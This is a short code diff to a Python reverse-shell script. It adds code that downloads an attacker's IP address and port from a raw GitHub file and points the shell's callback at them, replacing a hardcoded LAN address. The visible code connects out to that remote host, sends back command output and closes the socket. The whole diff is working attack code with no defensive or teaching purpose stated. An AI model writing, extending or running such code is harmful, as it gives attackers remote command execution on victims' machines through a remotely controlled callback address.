@@ -1,5 +1,12 @@
 import socket
 import subprocess
+import requests
+
+url = "https://raw.githubusercontent.com/utkuberkaytan/notorious_project/refs/heads/main/host"
+res = requests.get(url)
+lines = res.text.strip().split("\n")
+ip = lines[0]
+port = int(lines[1])
 
 def reverse_shell(host, port):
     s = socket.socket()
@@ -12,4 +19,4 @@ def reverse_shell(host, port):
         s.send(output.encode())
     s.close()
 
-reverse_shell("192.168.1.10", 4444)
+reverse_shell(ip, port)
